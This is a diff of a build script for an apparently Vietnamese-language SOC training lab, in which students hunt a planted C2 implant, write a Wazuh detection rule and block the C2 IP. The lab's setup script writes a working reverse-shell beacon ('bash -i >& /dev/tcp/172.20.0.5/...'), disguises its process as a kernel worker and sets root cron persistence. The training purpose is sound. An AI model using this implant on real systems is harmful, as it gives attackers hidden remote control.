@@ -58,10 +58,11 @@ while True:
 __EOF_TH_7k2m__
 mkdir -p "$LAB/config"
 cat > "$LAB/config/about.txt" <<'__EOF_TH_7k2m__'
-SOC Lab - Reverse shell + Threat Hunting.
-May target da bi nhiem san: mot cronjob dinh ky bung reverse shell ve may tan cong (C2).
-Nhiem vu: SAN moi de doa qua SIEM (Wazuh FIM + tien trinh/ket noi), xac dinh IOC,
-roi go sach persistence (cron + script doc) va vá lo hong de no khong tai ket noi.
+SOC Lab - Threat Hunting: San -> Phat hien -> Ung pho.
+May target bi cai implant C2 nguy trang (beacon ve may tan cong), lan giua cac ket noi lanh tinh.
+Nhiem vu 3 pha: (1) SAN ra cai doc giua nhieu + bao cao IOC (C2 IP + cong ca nhan hoa + tien trinh);
+(2) PHAT HIEN - tu viet luat Wazuh bat beacon; (3) UNG PHO phau thuat - chan dung IP C2 ma khong
+lam dut dich vu giam sat lanh tinh (SLA).
 __EOF_TH_7k2m__
 mkdir -p "$LAB/config"
 cat > "$LAB/config/parameter.config" <<'__EOF_TH_7k2m__'
@@ -73,9 +74,9 @@ C2PORT : RAND_REPLACE : target:.local/bin/fixlocal.sh;attacker:listen.py : C2POR
 __EOF_TH_7k2m__
 mkdir -p "$LAB/config"
 cat > "$LAB/config/start.config" <<'__EOF_TH_7k2m__'
-# start.config - Lab soc-threathunt (Reverse shell + Threat Hunting)
-# target bi NHIEM SAN: cron moi phut bung reverse shell ve attacker (C2 listener).
-# Sinh vien SAN moi de doa qua Wazuh (FIM + tien trinh), roi go sach persistence.
+# start.config - Lab soc-threathunt v2 (Threat Hunting: San -> Phat hien -> Ung pho)
+# target bi cai implant C2 nguy trang (beacon ve attacker). SV: SAN giua nhieu -> VIET LUAT Wazuh
+# bat beacon -> CHAN C2 phau thuat (khong lam dut giam sat lanh tinh).
 
 GLOBAL_SETTINGS
 	LAB_MASTER_SEED soc-threathunt_student_master_seed
@@ -146,6 +147,12 @@ LABEL version=$version
 ENV APT_SOURCE $apt_source
 RUN /usr/bin/apt-source.sh
 #
+# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
+ENV TZ=Asia/Ho_Chi_Minh
+RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
+    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
+    && rm -rf /var/lib/apt/lists/* || true
+#
 # python3 de chay C2 listener (socket trong thu vien chuan, khong can pip)
 RUN apt-get update && apt-get install -y --no-install-recommends python3 \
     && rm -rf /var/lib/apt/lists/* || true
@@ -187,6 +194,12 @@ LABEL version=$version
 ENV APT_SOURCE $apt_source
 RUN /usr/bin/apt-source.sh
 #
+# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
+ENV TZ=Asia/Ho_Chi_Minh
+RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
+    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
+    && rm -rf /var/lib/apt/lists/* || true
+#
 # Firefox co san trong base firefox3; them ssh client de SSH sang target xu ly su co
 RUN apt-get update || true; apt-get install -y --no-install-recommends openssh-client \
     && rm -rf /var/lib/apt/lists/*
@@ -227,6 +240,12 @@ ARG version
 LABEL version=$version
 ENV APT_SOURCE $apt_source
 RUN /usr/bin/apt-source.sh
+#
+# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
+ENV TZ=Asia/Ho_Chi_Minh
+RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
+    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
+    && rm -rf /var/lib/apt/lists/* || true
 #
 # Cong cu cho bake + cai offline (setcap = libcap2-bin)
 RUN apt-get update && apt-get install -y --no-install-recommends curl gnupg tar libcap2-bin openssl \
@@ -281,20 +300,26 @@ LABEL version=$version
 ENV APT_SOURCE $apt_source
 RUN /usr/bin/apt-source.sh
 #
+# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
+ENV TZ=Asia/Ho_Chi_Minh
+RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
+    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
+    && rm -rf /var/lib/apt/lists/* || true
+#
 # Cho prestop/analyst chay sudo khong mat khau mot so lenh dieu tra
-RUN echo '%sudo ALL=(ALL) NOPASSWD: /usr/bin/crontab, /bin/crontab, /usr/bin/cat, /bin/cat, /usr/sbin/ss, /sbin/ss, /bin/ss, /usr/bin/stat, /bin/stat' > /etc/sudoers.d/labtainer-hunt \
+RUN echo '%sudo ALL=(ALL) NOPASSWD: /usr/bin/crontab, /bin/crontab, /usr/bin/cat, /bin/cat, /usr/sbin/ss, /sbin/ss, /bin/ss, /usr/bin/stat, /bin/stat, /sbin/iptables, /usr/sbin/iptables' > /etc/sudoers.d/labtainer-hunt \
     && chmod 440 /etc/sudoers.d/labtainer-hunt
 #
-# cron (persistence) + iproute2 (ss) cho dieu tra ket noi
-RUN apt-get update && apt-get install -y --no-install-recommends cron iproute2 \
+# cron (persistence) + iproute2 (ss) cho dieu tra + iptables (ung pho chan C2)
+RUN apt-get update && apt-get install -y --no-install-recommends cron iproute2 iptables \
     && rm -rf /var/lib/apt/lists/* || true
 #
 # --- Wazuh agent (bake luc build, tro ve manager 172.20.0.20) ---
-RUN apt-get update && apt-get install -y --no-install-recommends apt-transport-https ca-certificates curl gnupg
+RUN apt-get update && apt-get install -y --no-install-recommends apt-transport-https ca-certificates curl gnupg && rm -rf /var/lib/apt/lists/*
 RUN curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import \
     && chmod 644 /usr/share/keyrings/wazuh.gpg
 RUN echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" > /etc/apt/sources.list.d/wazuh.list
-RUN apt-get update && WAZUH_MANAGER="172.20.0.20" apt-get install -y wazuh-agent
+RUN apt-get update && WAZUH_MANAGER="172.20.0.20" apt-get install -y wazuh-agent && rm -rf /var/lib/apt/lists/*
 RUN systemctl enable wazuh-agent
 RUN systemctl enable cron 2>/dev/null || true
 #
@@ -317,89 +342,145 @@ CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
 __EOF_TH_7k2m__
 mkdir -p "$LAB/docs"
 cat > "$LAB/docs/read_first.txt" <<'__EOF_TH_7k2m__'
-=== SOC Lab: Reverse shell + Threat Hunting (Wazuh SIEM) ===
+================================================================================
+ SOC LAB: THREAT HUNTING - SAN -> PHAT HIEN -> UNG PHO (Wazuh SIEM)
+================================================================================
 
-May "target" DA BI NHIEM SAN: mot cronjob dinh ky (moi phut) bung REVERSE SHELL ve may
-tan cong (C2). Ban KHONG biet truoc file doc o dau - phai SAN (threat hunting) qua SIEM.
+1. TONG QUAN (OVERVIEW)
+--------------------------------------------------------------------------------
+May 'target' da bi cai mot IMPLANT C2 chay ngam: dinh ky "goi ve" may tan cong
+(C2, 172.20.0.5) qua mot cong LA, tien trinh duoc NGUY TRANG cho giong tien trinh he thong.
+Quanh no con co cac ket noi/tien trinh LANH TINH (nhieu). Ban KHONG duoc cho biet truoc IOC -
+phai TU SAN ra giua dong nhieu. Day la 3 ky nang SOC noi tiep nhau:
+  (1) SAN (hunting) - tu tim ra cai doc; (2) PHAT HIEN (detection engineering) - tu viet luat
+  Wazuh de he thong tu canh bao; (3) UNG PHO - cat dut C2 mot cach CHINH XAC, khong lam hong
+  dich vu lanh tinh.
 
-Nhiem vu: DIEU TRA qua Wazuh, xac dinh IOC, roi GO SACH persistence + CAT DUT C2 +
-VA LO HONG de no khong tai ket noi. Thao tac tu tram DEFENDER.
+*** Lan dau cho siem cai Wazuh (~8-10'):  tail -f /var/log/wazuh-install.log ***
 
-*** Lan dau: cho siem cai Wazuh xong (~8-10'):  tail -f /var/log/wazuh-install.log ***
+2. MUC TIEU HOC TAP (OBJECTIVES)
+--------------------------------------------------------------------------------
+  - Phan biet hoat dong DOC voi LANH TINH dua tren hanh vi (beacon dinh ky, dich/cong la,
+    tien trinh nguy trang) - khong chi "thay ket noi ra ngoai la chan".
+  - Tu viet luat phat hien (Wazuh custom rule) + kiem thu bang wazuh-logtest.
+  - Ung pho PHAU THUAT: chan dung cai doc ma khong lam gian doan giam sat/dich vu that.
 
---- 1) San moi de doa tren dashboard (defender, Firefox tu mo) ---
-  https://172.20.0.20   admin / (tren siem: sudo cat /root/wazuh-admin-credentials.txt)
-  -> Vao muc "Integrity monitoring" (FIM): tim FILE LA / bi thay doi lien tuc
-     (goi y: /usr/local/bin, /etc/cron.d, /tmp). Ghi lai duong dan file doc.
+3. KIEN THUC NEN (BACKGROUND)
+--------------------------------------------------------------------------------
+* Reverse shell / C2 beacon: may nan nhan CHU DONG ket noi ra may ke tan cong theo chu ky
+  ("beacon"), tao kenh dieu khien. Dau hieu san: ket noi ra mot host/cong bat thuong, lap lai
+  deu dan; tien trinh dang ngo (ten gia danh tien trinh he thong nhung lai co ket noi mang).
+* Nguy trang (masquerading): malware thuong dat ten giong tien trinh that (vd '[kworker/...]',
+  'sysmon', 'update'...). Tien trinh nhan kernel that KHONG co ket noi mang - do la cach phan biet.
+* Wazuh custom rule: them luat vao /var/ossec/etc/rules/local_rules.xml tren SIEM (id >= 100000),
+  dung <match>/<regex>/<program_name> de khop dong log; test bang `wazuh-logtest` (dan 1 dong log
+  vao, xem luat co khop + level); nap luat bang `systemctl restart wazuh-manager`.
+* MITRE ATT&CK lien quan: T1053 (Scheduled Task/cron - persistence), T1059 (Command/Shell),
+  T1071 (Application Layer Protocol - C2). Dashboard Wazuh co module MITRE de doi chieu.
+* Ung pho phau thuat: chan DUNG IP C2 (tuong lua theo -d <ip>) thay vi "drop het egress" (se cat
+  luon ket noi Wazuh agent -> mu giam sat). Cat mau dung cho, giu dich vu that song.
 
---- 2) Dieu tra sau tren target (SSH tu defender) ---
-  ssh analyst@target            (mat khau: analyst)
-  a. Xem persistence:   cat /etc/cron.d/*            (tim dong cron la)
-                        ls -la /usr/local/bin/        (file doc, chu y quyen 0777 = LO HONG)
-  b. Xem ket noi C2:    sudo ss -tnp | grep -v 127.0.0.1    (tim ket noi ra 172.20.0.5:<cong>)
-                        -> ghi lai C2 IP + CONG (moi sinh vien mot cong khac nhau)
-  c. Ghi bao cao:       sua /home/analyst/findings.txt theo dinh dang KEY=value:
-       C2_IP=172.20.0.5
-       C2_PORT=<cong ban tim duoc>
-       MAL_SCRIPT=/usr/local/bin/.sysupdate
-       CRON_PERIOD=moi phut
+4. MOI TRUONG & SO DO (TOPOLOGY)
+--------------------------------------------------------------------------------
+  attacker (172.20.0.5, AN)  -- C2 listener (noi implant goi ve)
+  target   (172.20.0.10)     -- may nhiem; co Wazuh agent + log giam sat /var/log/netmon.log
+  siem     (172.20.0.20)     -- Wazuh (dashboard https://172.20.0.20) + noi ban VIET LUAT
+  defender (172.20.0.30)     -- tram cua ban: Firefox + SSH
+  Dang nhap target de dieu tra:  ssh analyst@target   (mat khau: analyst)
 
---- 3) Go sach + va lo hong (LAM THEO THU TU) ---
-  d. Xoa cron TRUOC (chan tai cai):   sudo rm -f /etc/cron.d/sysupdate
-  e. Kill tien trinh reverse shell:   sudo ss -tnp | grep 172.20.0.5     # xem pid=NNN
-                                      sudo kill -9 <NNN>
-  f. Xoa script doc + lock/beacon:    sudo rm -f /usr/local/bin/.sysupdate /tmp/.sysupd.lock /tmp/.c2beacon
-  g. Kiem chung: sudo ss -tn | grep 172.20.0.5    -> KHONG con ket noi nao.
+5. NHIEM VU (TASKS)
+--------------------------------------------------------------------------------
+--- PHA 1: SAN (tim ra cai doc giua nhieu) ---
+  a. Dashboard Wazuh (admin / tren siem: sudo cat /root/wazuh-admin-credentials.txt):
+     - Integrity Monitoring (FIM): co FILE LA bi them/sua o dau? (goi y: thu muc nhi phan he thong,
+       thu muc cron, /tmp).
+     - Xem log giam sat ket noi (Threat Hunting / Security events): co dong ket noi (netmon) nao ra
+       mot dich DANG NGO khong? Phan biet dich LANH TINH (may SIEM) voi dich LA.
+  b. Tren target (ssh analyst@target), xac nhan bang cong cu he thong:
+     - Liet ke ket noi dang mo + tien trinh so huu (goi y: cong cu liet ke socket, co kem tien trinh).
+     - Chu y tien trinh NGUY TRANG: ten giong tien trinh he thong nhung co ket noi mang.
+  c. Ghi vao /home/analyst/findings.txt: C2_IP, C2_PORT (cong cua MAY BAN - tu san), MAL_PROC
+     (ten tien trinh doc), MAL_SCRIPT (duong dan implant).
 
-Xong: checkwork (tu kiem tra) hoac stoplab (nop bai).
-Muc tieu: incident_resolved = Y  (het cron + het ket noi C2 + het tien trinh doc).
+--- PHA 2: PHAT HIEN (tu viet luat Wazuh) ---
+  Tren SIEM (ssh/terminal siem), sua /var/ossec/etc/rules/local_rules.xml, THEM mot luat (id >= 100000)
+  khop dong log beacon toi C2 va dat level canh bao. Khung vi du (tu dien IP C2 BAN da tim):
+      <group name="local,threat_hunt,">
+        <rule id="100200" level="12">
+          <match>netmon: conn dst=&lt;IP_C2_BAN_TIM&gt;</match>
+          <description>C2 beacon detected</description>
+          <group>c2_detected,</group>
+        </rule>
+      </group>
+  - Kiem thu: `/var/ossec/bin/wazuh-logtest`  (dan 1 dong netmon tu /var/log/netmon.log -> xem luat
+    co khop + dung level khong).
+  - Nap luat: `sudo systemctl restart wazuh-manager`.
+  - Xac nhan: tren dashboard (Security events) thay canh bao tu luat cua ban no len.
+  *** Lam PHA 2 KHI beacon con hoat dong (truoc khi chan) de luat co du lieu ma no. ***
+
+--- PHA 3: UNG PHO PHAU THUAT ---
+  - CHAN dung IP C2 o tang mang (goi y: luat tuong lua chan theo dia chi dich la IP C2).
+  - KHONG chan bua (vd drop toan bo egress) -> se cat luon ket noi Wazuh agent toi SIEM (172.20.0.20)
+    va lam mu giam sat (TRUOT SLA).
+  - Kiem chung: luat iptables chan 172.20.0.5 da co (sudo iptables -S | grep 172.20.0.5);
+    ket noi toi 172.20.0.20 (SIEM) VAN con. (Luu y: ket noi .5 dang ESTABLISHED co the con hien
+    vai phut cho den khi TCP timeout - cham diem theo LUAT chan, khong theo so ket noi.)
+
+6. NOP BAI (SUBMISSION)
+--------------------------------------------------------------------------------
+  checkwork -> tu kiem tra ; stoplab -> nop bai.
+  Cac muc cham (chi cham VIEC BAN LAM):
+    - reported       : dung C2 IP + CONG ca nhan hoa + ten tien trinh doc.
+    - detection_rule : luat Wazuh tu viet NO canh bao tren beacon.
+    - contained      : da CHAN IP C2 (172.20.0.5) bang iptables.
+    - sla_ok         : dich vu giam sat lanh tinh (ket noi toi SIEM) van song (khong chan bua).
+    - incident_resolved : xay duoc phat hien + cat C2 + khong lam hong dich vu lanh tinh.
 __EOF_TH_7k2m__
 mkdir -p "$LAB/instr_config"
 cat > "$LAB/instr_config/goals.config" <<'__EOF_TH_7k2m__'
-# goals.config - tieu chi dat/khong dat (Reverse shell + Threat Hunting)
+# goals.config - Threat Hunting v2 (San -> Phat hien -> Ung pho)
+# Chi cham VIEC SINH VIEN LAM (bo threat_detected/agent_connected vi chung tu Y khi lab chay).
 
-# Dieu tra / phat hien
-threat_detected   = boolean : _siem_detected
-agent_connected   = boolean : _agent_connected
-reported_ioc      = boolean : _reported
+# PHA 1 - SAN: bao cao dung IOC (C2 IP + CONG ca nhan hoa + ten tien trinh doc)
+reported       = boolean : ( _marker and _rep_ip and _rep_port and _rep_proc )
+# PHA 2 - PHAT HIEN: luat Wazuh tu viet NO canh bao tren beacon
+detection_rule = boolean : _detection
+# PHA 3 - UNG PHO: da chan IP C2 (.5) bang iptables
+contained      = boolean : ( _marker and _contained )
+# PHA 3 (SLA): khong chan bua - dich vu giam sat lanh tinh (.20) van song
+sla_ok         = boolean : ( _marker and _sla )
 
-# Go bo (nhieu buoc)
-cron_removed      = boolean : ( _marker and_not _cron )
-vuln_patched      = boolean : ( _marker and_not _script_ww )
-process_killed    = boolean : ( _marker and_not _proc )
-no_c2_connection  = boolean : ( _marker and_not _c2 )
-
-# MUC TIEU TONG: go sach persistence + cat dut C2 (khong con cron, khong con ket noi, khong con tien trinh)
-incident_resolved = boolean : ( _marker and_not _cron and_not _c2 and_not _proc )
+# MUC TIEU TONG: xay duoc phat hien + chan dut C2 + KHONG lam hong dich vu lanh tinh
+incident_resolved = boolean : ( _marker and _detection and _contained and _sla )
 __EOF_TH_7k2m__
 mkdir -p "$LAB/instr_config"
 cat > "$LAB/instr_config/results.config" <<'__EOF_TH_7k2m__'
-# results.config - trich du lieu cham diem (doc tu prestop.stdout)
+# results.config - Threat Hunting v2 (San -> Phat hien -> Ung pho)
+# Chi cham VIEC SINH VIEN LAM; prestop chi in co/OK, khong lo IOC.
 
+# --- target ---
 _marker    = target:prestop.stdout : FILE_REGEX : PRESTOP_MARKER
-# Con cron doc? (chi khop dong cron tham chieu script, da gan tien to CRONLINE:)
-_cron      = target:prestop.stdout : FILE_REGEX : CRONLINE:
-# Script con world-writable? (octet cuoi co bit ghi cho 'other': 2,3,6,7)
-_script_ww = target:prestop.stdout : FILE_REGEX : SCRIPT_STAT=[0-7][0-7][2367]
-# Con tien trinh reverse shell dang chay?
-_proc      = target:prestop.stdout : FILE_REGEX : PROC:
-# Con ket noi C2 toi attacker (bat ky cong nao)?
-_c2        = target:prestop.stdout : FILE_REGEX : C2_CONN=[1-9]
-# Analyst da ghi IOC (C2 IP)?
-_reported  = target:prestop.stdout : FILE_REGEX : C2_IP=172\.20\.0\.5
-# SIEM co canh bao (FIM/syscheck ve file doc hoac beacon)?
-_siem_detected   = siem:prestop.stdout : FILE_REGEX : (syscheck|Integrity|sysupdate|c2beacon|cron)
-_agent_connected = siem:prestop.stdout : FILE_REGEX : target.*Active
+# Containment: da chan IP C2 (.5) bang iptables chua?
+_contained = target:prestop.stdout : FILE_REGEX : CONTAINED
+# SLA: ket noi lanh tinh toi SIEM (.20) con song?
+_sla       = target:prestop.stdout : FILE_REGEX : SLA_OK
+# Bao cao: C2 IP + CONG ca nhan hoa + ten tien trinh doc
+_rep_ip    = target:prestop.stdout : FILE_REGEX : REP_IP_OK
+_rep_port  = target:prestop.stdout : FILE_REGEX : REP_PORT_OK
+_rep_proc  = target:prestop.stdout : FILE_REGEX : REP_PROC_OK
+
+# --- siem: luat phat hien cua SV co no canh bao tren beacon khong? ---
+_detection = siem:prestop.stdout : FILE_REGEX : DETECTION_OK
 
 # --- Goi y checkwork ---
-#CHECK_FALSE: Van con cronjob doc (CRONLINE). Hay xoa: sudo rm -f /etc/cron.d/sysupdate
-cw_cron = target:prestop.stdout : FILE_REGEX : CRONLINE:
-#CHECK_FALSE: Script doc van world-writable (lo hong chua va). Hay xoa script hoac bo quyen ghi cho 'other'.
-cw_ww = target:prestop.stdout : FILE_REGEX : SCRIPT_STAT=[0-7][0-7][2367]
-#CHECK_FALSE: Van con ket noi reverse shell toi C2. Tim PID: sudo ss -tnp | grep 172.20.0.5 ; roi kill.
-cw_c2 = target:prestop.stdout : FILE_REGEX : C2_CONN=[1-9]
-#CHECK_TRUE: Chua ghi IOC vao /home/analyst/findings.txt (vi du: C2_IP=172.20.0.5).
-cw_report = target:prestop.stdout : FILE_REGEX : C2_IP=172\.20\.0\.5
+#CHECK_TRUE: Chua CHAN C2 - hay chan DUNG IP C2 (iptables ... -d 172.20.0.5 -j DROP). Ket noi ESTABLISHED con dinh se tu timeout.
+cw_contained = target:prestop.stdout : FILE_REGEX : CONTAINED
+#CHECK_TRUE: Ket noi lanh tinh toi SIEM (172.20.0.20) phai CON - dung chan bua (drop het egress) lam dut giam sat.
+cw_sla = target:prestop.stdout : FILE_REGEX : SLA_OK
+#CHECK_TRUE: Chua viet duoc luat Wazuh bat beacon. Them rule vao local_rules.xml (id>=100000) match 'netmon: conn dst=172.20.0.5', test wazuh-logtest, restart wazuh-manager.
+cw_det = siem:prestop.stdout : FILE_REGEX : DETECTION_OK
+#CHECK_TRUE: Chua bao cao du IOC (C2 IP + CONG ca nhan hoa + ten tien trinh) trong /home/analyst/findings.txt.
+cw_rep = target:prestop.stdout : FILE_REGEX : REP_PORT_OK
 __EOF_TH_7k2m__
 mkdir -p "$LAB/siem/_bin"
 cat > "$LAB/siem/_bin/fixlocal.sh" <<'__EOF_TH_7k2m__'
@@ -415,15 +496,17 @@ __EOF_TH_7k2m__
 mkdir -p "$LAB/siem/_bin"
 cat > "$LAB/siem/_bin/prestop" <<'__EOF_TH_7k2m__'
 #!/bin/bash
-# Chay luc 'checkwork'/'stoplab' tren siem. Chup bang chung SIEM phat hien moi de doa.
+# Chay luc checkwork/stoplab tren siem. Cham PHA 2 (detection engineering):
+# Wazuh chi ghi ALERT khi co RULE khop. Khong built-in rule nao biet toi /var/log/netmon.log,
+# nen neu alerts.log co dong 'netmon: conn dst=172.20.0.5' => chac chan LUAT CUA SV da no.
+# Chi in co/OK, khong dump IOC.
 trap "echo Timed out; exit" SIGTERM
 
-echo "=== wazuh alerts (FIM / reverse shell / 172.20.0.5) ==="
-sudo -n cat /var/ossec/logs/alerts/alerts.log 2>/dev/null \
-  | grep -iE 'syscheck|integrity|sysupdate|c2beacon|cron|172.20.0.5' | tail -50
+echo "PRESTOP_MARKER_SIEM"
+sudo -n grep -aE 'netmon: conn dst=172\.20\.0\.5' /var/ossec/logs/alerts/alerts.log 2>/dev/null \
+  | grep -q . && echo "DETECTION_OK"
 
-echo "=== agents ==="
-sudo -n /var/ossec/bin/agent_control -l 2>/dev/null
+exit 0
 __EOF_TH_7k2m__
 mkdir -p "$LAB/siem"
 cat > "$LAB/siem/wazuh-setup.sh" <<'__EOF_TH_7k2m__'
@@ -441,85 +524,111 @@ __EOF_TH_7k2m__
 mkdir -p "$LAB/target/_bin"
 cat > "$LAB/target/_bin/fixlocal.sh" <<'__EOF_TH_7k2m__'
 #!/bin/bash
-# Chay LAN DAU tren target, quyen user 'ubuntu'. $1 = mat khau sudo.
-# Gieo "nhiem san": script doc world-writable + cron moi phut -> reverse shell ve C2.
+# Chay LAN DAU tren target, quyen 'ubuntu'. $1 = mat khau sudo.
+# Gieo implant C2 nguy trang + log giam sat ket noi (/var/log/netmon.log) cho detection engineering.
 PW="$1"
+S(){ echo "$PW" | sudo -S "$@"; }
 
-# ============ 1) Script doc (LO HONG: world-writable 0777) ============
-cat > /tmp/.sysupdate <<'SH'
+# ===== 1) Implant beacon (nguy trang 'sysmon') - cron moi phut =====
+cat > /tmp/.sysmon <<'SH'
 #!/bin/bash
-# "sysupdate" - thuc chat la beacon reverse shell (persistence)
+# "sysmon" - thuc chat la beacon C2 nguy trang (persistence). Cron chay moi phut.
 exec 2>/dev/null
-# Chi 1 instance (giu ket noi ben vung, tranh chong chat tien trinh)
-exec 9>/tmp/.sysupd.lock
+# (a) LUON ghi su kien beacon vao log giam sat (cho detection) - moi lan chay, doc lap ket noi
+printf '%s %s netmon: conn dst=172.20.0.5 dport=C2PORT proc=kworker-helper\n' "$(date '+%b %e %H:%M:%S')" "$(hostname)" >> /var/log/netmon.log
+# (b) Giu DUY NHAT mot ket noi reverse shell; nguy trang ten tien trinh = [kworker/0:2]
+exec 9>/tmp/.beacon.lock
 flock -n 9 || exit 0
 touch /tmp/.c2beacon
-# exec -a: dat ten tien trinh = .sysupdate de hien ro trong 'ps' (cho SV san)
-exec -a .sysupdate bash -i >& /dev/tcp/172.20.0.5/C2PORT 0>&1
+exec -a "[kworker/0:2]" bash -i >& /dev/tcp/172.20.0.5/C2PORT 0>&1
 SH
-echo "$PW" | sudo -S cp /tmp/.sysupdate /usr/local/bin/.sysupdate
-echo "$PW" | sudo -S chmod 0777 /usr/local/bin/.sysupdate   # <== LO HONG: ai cung ghi duoc
-echo "$PW" | sudo -S chown root:root /usr/local/bin/.sysupdate
+S cp /tmp/.sysmon /usr/local/bin/.sysmon
+S chmod 755 /usr/local/bin/.sysmon
+S chown root:root /usr/local/bin/.sysmon
 
-# ============ 2) Persistence: cron chay moi phut (duoi quyen root) ============
-echo "$PW" | sudo -S bash -c 'echo "* * * * * root /usr/local/bin/.sysupdate" > /etc/cron.d/sysupdate; chmod 644 /etc/cron.d/sysupdate'
-echo "$PW" | sudo -S service cron restart 2>/dev/null \
-  || echo "$PW" | sudo -S systemctl restart cron 2>/dev/null || true
+# ===== 2) Monitor ket noi (sinh dong lanh tinh lam nhieu + xac nhan .5 khi con ket noi) =====
+cat > /tmp/netmon <<'SH'
+#!/bin/bash
+exec 2>/dev/null
+ss -tn state established 2>/dev/null | tail -n +2 | awk '{print $NF}' | while read peer; do
+  ip=${peer%:*}; port=${peer##*:}
+  case "$ip" in ""|127.*|0.0.0.0|::*|*[!0-9.]*) continue;; esac
+  printf '%s %s netmon: conn dst=%s dport=%s proc=monitor\n' "$(date '+%b %e %H:%M:%S')" "$(hostname)" "$ip" "$port" >> /var/log/netmon.log
+done
+SH
+S cp /tmp/netmon /usr/local/bin/netmon
+S chmod 755 /usr/local/bin/netmon
+S bash -c ': > /var/log/netmon.log; chmod 644 /var/log/netmon.log'
 
-# ============ 3) Wazuh FIM: giam sat realtime thu muc bi dong cham ============
+# ===== 3) Persistence: cron moi phut (quyen root) =====
+S bash -c 'printf "%s\n%s\n" "* * * * * root /usr/local/bin/.sysmon" "* * * * * root /usr/local/bin/netmon" > /etc/cron.d/sysmon; chmod 644 /etc/cron.d/sysmon'
+S service cron restart 2>/dev/null || S systemctl restart cron 2>/dev/null || true
+S service rsyslog start 2>/dev/null || S systemctl start rsyslog 2>/dev/null || true
+
+# (Khong can ground-truth root: cong C2 ca nhan hoa duoc prestop doc lai tu chinh dong beacon
+#  trong /var/log/netmon.log luc cham diem.)
+
+# ===== 4) Wazuh agent: giam sat netmon.log (cho SV viet luat) + FIM (cho san qua dashboard) =====
+LF='<localfile><log_format>syslog</log_format><location>/var/log/netmon.log</location></localfile>'
 FIM='<directories realtime="yes" check_all="yes" report_changes="yes">/usr/local/bin,/etc/cron.d,/tmp</directories>'
-echo "$PW" | sudo -S sed -i "s#<syscheck>#<syscheck>\n    ${FIM}#" /var/ossec/etc/ossec.conf 2>/dev/null
-echo "$PW" | sudo -S systemctl restart wazuh-agent 2>/dev/null \
-  || echo "$PW" | sudo -S service wazuh-agent restart 2>/dev/null || true
+S sed -i "s#</ossec_config>#${LF}</ossec_config>#" /var/ossec/etc/ossec.conf 2>/dev/null
+S sed -i "s#<syscheck>#<syscheck>\n    ${FIM}#" /var/ossec/etc/ossec.conf 2>/dev/null
+S systemctl restart wazuh-agent 2>/dev/null || S service wazuh-agent restart 2>/dev/null || true
 
-# ============ 4) Tai khoan analyst cho DEFENDER SSH sang xu ly ============
-echo "$PW" | sudo -S useradd -m -s /bin/bash analyst 2>/dev/null
-echo "$PW" | sudo -S bash -c 'echo "analyst:analyst" | chpasswd'
-echo "$PW" | sudo -S usermod -aG sudo analyst 2>/dev/null
+# ===== 6) analyst cho DEFENDER SSH sang dieu tra =====
+S useradd -m -s /bin/bash analyst 2>/dev/null
+S bash -c 'echo "analyst:analyst" | chpasswd'
+S usermod -aG sudo analyst 2>/dev/null
 cat > /tmp/findings.txt <<'FND'
-# BAO CAO SAN MOI DE DOA - dien gia tri ban tim duoc (giu dinh dang KEY=value):
+# BAO CAO SAN MOI DE DOA (Threat Hunting) - dien gia tri ban TU TIM DUOC (KEY=value):
+# C2_IP      : dia chi may tan cong (C2)
+# C2_PORT    : cong C2 (moi may mot khac - tu san ra)
+# MAL_PROC   : ten tien trinh doc (nguy trang)
+# MAL_SCRIPT : duong dan script/implant doc
 C2_IP=
 C2_PORT=
+MAL_PROC=
 MAL_SCRIPT=
-CRON_PERIOD=
 FND
-echo "$PW" | sudo -S cp /tmp/findings.txt /home/analyst/findings.txt
-echo "$PW" | sudo -S chown analyst:analyst /home/analyst/findings.txt
-echo "$PW" | sudo -S chmod 644 /home/analyst/findings.txt
+S cp /tmp/findings.txt /home/analyst/findings.txt
+S chown analyst:analyst /home/analyst/findings.txt
+S chmod 644 /home/analyst/findings.txt
 
 exit 0
 __EOF_TH_7k2m__
 mkdir -p "$LAB/target/_bin"
 cat > "$LAB/target/_bin/prestop" <<'__EOF_TH_7k2m__'
 #!/bin/bash
-# Chup trang thai target luc checkwork/stoplab -> prestop.stdout (dung cham diem).
-# Tat ca world-readable nen khong can sudo.
+# Chup trang thai target luc checkwork/stoplab -> prestop.stdout (cham diem).
+# Chi in co/OK, KHONG lo IOC (IP/cong/ten) -> tranh SV doc prestop.stdout de chep dap an.
 trap "echo Timed out; exit" SIGTERM
 
 echo "PRESTOP_MARKER"
 
-echo "=== cron (persistence) ==="
-{ cat /etc/cron.d/* 2>/dev/null; sudo -n crontab -l -u root 2>/dev/null; } \
-  | grep -iE 'sysupdate|dev/tcp' | sed 's/^/CRONLINE: /'
+# Containment: da CHAN IP C2 (.5) bang iptables chua? -> chan la hanh dong containment.
+# (Cham theo LUAT, khong dem ket noi 'ss': iptables DROP de ket noi ESTABLISHED con dinh
+#  vai phut cho timeout -> dem ket noi se bao sai 'chua chan' du SV da chan dung.)
+sudo -n iptables -S 2>/dev/null | grep -qE '172\.20\.0\.5(/32)?.*-j (DROP|REJECT)' && echo "CONTAINED"
 
-echo "SCRIPT_STAT=$(stat -c '%a %n' /usr/local/bin/.sysupdate 2>/dev/null || echo MISSING)"
